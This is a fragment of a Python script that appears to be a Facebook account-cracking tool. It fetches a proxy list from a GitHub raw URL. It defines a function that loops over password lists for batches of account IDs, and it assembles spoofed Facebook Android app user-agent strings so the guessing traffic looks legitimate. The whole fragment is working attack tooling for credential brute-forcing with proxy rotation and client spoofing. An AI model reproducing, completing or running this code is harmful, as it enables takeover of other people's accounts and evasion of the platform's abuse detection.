...
#------------------[ PROXY SERVER ]-------------------#
proxylist = requests.get('https://raw.githubusercontent.com/fayssaldemiai25-art/My-Fayssal/main/my_proxies.txt').text
open('socksku.txt', 'w').write(proxylist)
proxsi = open('socksku.txt', 'r').read().splitlines()

os.system('rm -rf prox.txt')  
try:
    prox= requests.get('https://raw.githubusercontent.com/fayssaldemiai25-art/My-Fayssal/main/my_proxies.txt').text
...
def M_file_1(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                u1a = "[FBAN/FB4A;FBAV/"+str(random.randint(49,66))+'.0.0.'+str(random.randrange(20,49))+str(random.randint(11,99)) +";FBBV/"+str(random.randint(11111111,77777777))+";Dalvik/2.1.0 (Linux; U; Android 12; Samsung Galaxy Note 20 Build/SP1A.210812.016) [FBAN/345.0.0.20.120;FBBV/225678901;FBRV/8;com.facebook.katana;FBLC/en_US;FBMF/Samsung;FBBD/Samsung;FBDV/SM-N980F;FBSV/12;FBCA/arm64-v8a:armeabi;FBDM/{density=2.625,width=1080,height=2400};FB_FW/1;]"+"Dalvik/2.1.0 (Linux; U; Android 11; Samsung Galaxy Note 20 Build/RP1A.200720.012) [FBAN/341.0.0.18.120;FBBV/224567890;FBRV/7;com.facebook.katana;FBLC/en_US;FBMF/Samsung;FBBD/Samsung;FBDV/SM-N980F;FBSV/11;FBCA/arm64-v8a:armeabi;FBDM/{density=2.5,width=1080,height=2400};FB_FW/1;]"+"Dalvik/2.1.0 (Linux; U; Android 10; Samsung Galaxy Note 20 Build/QP1A.190711.020) [FBAN/340.0.0.17.120;FBBV/223456789;FBRV/6;com.facebook.katana;FBLC/en_US;FBMF/Samsung;FBBD/Samsung;FBDV/SM-N980F;FBSV/10;FBCA/arm64-v8a:armeabi;FBDM/{density=2.25,width=1080,height=2280};FB_FW/1;]"+"Dalvik/2.1.0 (Linux; U; Android 9; Samsung Galaxy Note 20 Build/QP1A.190711.020) [FBAN/338.6.2.0;FBBV/222274714;FBRV/5;com.facebook.katana;FBLC/en_US;FBMF/Samsung;FBBD/Samsung;FBDV/SM-N980F;FBSV/11;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=1080,height=2280};FB_FW/1;]"
